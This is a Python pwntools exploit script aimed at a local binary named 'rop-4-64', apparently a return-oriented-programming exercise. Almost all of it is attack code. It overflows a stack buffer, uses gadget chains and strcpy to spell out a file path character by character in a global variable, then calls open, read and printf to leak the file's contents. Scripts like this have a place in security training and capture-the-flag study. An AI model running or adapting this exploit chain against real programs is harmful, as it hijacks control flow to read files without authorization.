#!/usr/bin/env python 
from pwn import *
import os


p = process("./rop-4-64")

#gdb info functions
"""
0x00000000004005d0  open@plt
0x00000000004005b0  read@plt
0x00000000004005a0  printf@plt
"""
openn =p64(0x4005d0)
read=p64(0x4005b0)
printt=p64(0x4005a0)

"""
0x0000000000400648 : pop rbp ; ret
0x0000000000400863 : pop rdi ; ret
0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
0x0000000000400861 : pop rsi ; pop r15 ; ret
"""
pop_rdi_ret = p64(0x400863)
pop_rsi_r15_ret = p64(0x400861)
pop_rdx_rbp_ret = p64(0x40073f)

strcpy_addr = p64(0x4006e2)
target_global_var = p64(0x0000000000601060)

buf = "A" * 0x80 + "A" * 8

# 0x400908:       "/"
buf += pop_rdi_ret
buf += target_global_var
buf += pop_rsi_r15_ret
buf += p64(0x400908)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601061)
buf += pop_rsi_r15_ret
buf += p64(0x400891)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601062)
buf += pop_rsi_r15_ret
buf += p64(0x40089c)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601063)
buf += pop_rsi_r15_ret
buf += p64(0x4008a6)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601064)
buf += pop_rsi_r15_ret
buf += p64(0x4008ac)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601065)
buf += pop_rsi_r15_ret
buf += p64(0x400908)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601066)
buf += pop_rsi_r15_ret
buf += p64(0x4008b3)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601068)
buf += pop_rsi_r15_ret
buf += p64(0x40089a)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601069)
buf += pop_rsi_r15_ret
buf += p64(0x4008a8)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060106a)
buf += pop_rsi_r15_ret
buf += p64(0x400908)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060106b)
buf += pop_rsi_r15_ret
buf += p64(0x40089d)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060106c)
buf += pop_rsi_r15_ret
buf += p64(0x400892)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060106d)
buf += pop_rsi_r15_ret
buf += p64(0x400892)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060106e)
buf += pop_rsi_r15_ret
buf += p64(0x400898)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060106f)
buf += pop_rsi_r15_ret
buf += p64(0x4008dd)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601070)
buf += pop_rsi_r15_ret
buf += p64(0x400908)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601071)
buf += pop_rsi_r15_ret
buf += p64(0x40089b)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601073)
buf += pop_rsi_r15_ret
buf += p64(0x4008a7)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601074)
buf += pop_rsi_r15_ret
buf += p64(0x4008e3)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601075)
buf += pop_rsi_r15_ret
buf += p64(0x4008dc)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601076)
buf += pop_rsi_r15_ret
buf += p64(0x4008e3)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601077)
buf += pop_rsi_r15_ret
buf += p64(0x4008de)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601078)
buf += pop_rsi_r15_ret
buf += p64(0x4008dc)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x0000000000601079)
buf += pop_rsi_r15_ret
buf += p64(0x400908)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060107a)
buf += pop_rsi_r15_ret
buf += p64(0x4008a0)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060107b)
buf += pop_rsi_r15_ret
buf += p64(0x4008b3)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060107d)
buf += pop_rsi_r15_ret
buf += p64(0x4008ba)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += p64(0x000000000060107e)
buf += pop_rsi_r15_ret
buf += p64(0x4008bc)
buf += p64(0)
buf += strcpy_addr

buf += pop_rdi_ret
buf += target_global_var
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += openn

buf += pop_rdi_ret
buf += p64(3)
buf += pop_rsi_r15_ret
buf += p64(0x601800)
buf += p64(0)
buf += pop_rdx_rbp_ret
buf += p64(100)
buf += p64(0)
buf += read

buf += pop_rdi_ret
buf += p64(0x601800)
buf += printt

print(buf)
p.sendline(buf)
p.interactive()
p.close()

